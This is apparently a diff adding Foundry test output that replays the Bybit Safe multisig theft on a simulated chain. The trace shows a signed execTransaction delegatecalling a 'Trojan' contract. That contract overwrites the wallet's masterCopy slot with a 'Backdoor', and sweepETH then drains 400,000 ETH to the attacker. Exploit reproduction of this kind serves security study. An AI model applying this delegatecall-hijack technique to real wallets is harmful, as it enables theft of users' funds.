+    ├─ [34680] 0x3e4d9f3Eb3cff27902b4a07d5ec90ACfe5657615::execTransaction(Trojan: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0, 0xa9059cbb0000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b0000000000000000000000000000000000000000000000000000000000000000, 1, 45746 [4.574e4], 0, 0, 0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 0x2b89bd9c58d5276b6964d16c33c6eb054eac80d5625e5e19199f25532a6b0e474f5bdb5260985c12f07b28867fe6ccbac236de4cfd88f21b8180f6a9e3bf0be41b090e00f26a9bd4cd263a7335344b7234007a09aff18e28572e072da67bb7017208c683ee5b5073bcd4a0c266191b0dc242c0ab2e952a8107efb79fbb319cb3f01b)
+    │   ├─ [34235] Safe master copy::execTransaction(Trojan: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0, 0xa9059cbb0000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b0000000000000000000000000000000000000000000000000000000000000000, 1, 45746 [4.574e4], 0, 0, 0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 0x2b89bd9c58d5276b6964d16c33c6eb054eac80d5625e5e19199f25532a6b0e474f5bdb5260985c12f07b28867fe6ccbac236de4cfd88f21b8180f6a9e3bf0be41b090e00f26a9bd4cd263a7335344b7234007a09aff18e28572e072da67bb7017208c683ee5b5073bcd4a0c266191b0dc242c0ab2e952a8107efb79fbb319cb3f01b) [delegatecall]
+    │   │   ├─ [3000] PRECOMPILES::ecrecover(0x56caa7755b65800df665310d890787a5ccf4f69bb4dec9717b6c3e5cf0036759, 27, 19692819182121484974589731180955757425683972484333339432522642229316721249863, 35895011824311108625850778017232682790574234157986912406405425659239148227556) [staticcall]
+    │   │   │   └─ ← [Return] 0x6cd5327027190eF45476D80B5D3BdE2E80f6aCbC
+    │   │   ├─ [3000] PRECOMPILES::ecrecover(0x56caa7755b65800df665310d890787a5ccf4f69bb4dec9717b6c3e5cf0036759, 27, 4095558031690596503500766790008962748814134926069295633683500973115162689906, 3969249062347502166121477980627020210992993363280052410428851032598102455280) [staticcall]
+    │   │   │   └─ ← [Return] 0xe6A99c3869D6D0691CCe23E83b571A471Bac661D
+    │   │   ├─ [884] Trojan::transfer(Backdoor: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 0) [delegatecall]
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0: 0x00000000000000000000000034cfac646f301356faa8b21e94227e3583fe3f5f → 0x0000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit ExecutionSuccess(txHash: 0x56caa7755b65800df665310d890787a5ccf4f69bb4dec9717b6c3e5cf0036759, payment: 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 5: 0 → 1
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    ├─ [0] VM::load(0x3e4d9f3Eb3cff27902b4a07d5ec90ACfe5657615, 0x0000000000000000000000000000000000000000000000000000000000000000) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b
+    ├─ [0] console::log("After attack, multisigWallet masterCopy:", Backdoor: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] VM::deal(0x3e4d9f3Eb3cff27902b4a07d5ec90ACfe5657615, 400000000000000000000000 [4e23])
+    │   └─ ← [Return]
+    ├─ [0] VM::deal(Bybit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   └─ ← [Return]
+    ├─ [7905] 0x3e4d9f3Eb3cff27902b4a07d5ec90ACfe5657615::sweepETH(Bybit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─ [7574] Backdoor::sweepETH(Bybit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   ├─ [41] Bybit::fallback{value: 400000000000000000000000}()
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [0] console::log("After attack, multisigWallet balance left:", 0, "ETH") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Attacker earned balance:", 400000 [4e5], "ETH") [staticcall]
+    │   └─ ← [Stop]
+    ├─  storage changes:
+    │   @ 42: 0 → 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   @ 43: 0 → 0x0000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b
+    │   @ 44: 0 → 0x0000000000000000000000003e4d9f3eb3cff27902b4a07d5ec90acfe5657615
+    └─ ← [Stop]
+
+Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 12.67s (12.72s CPU time)
+
+Ran 1 test suite in 20.95s (12.67s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
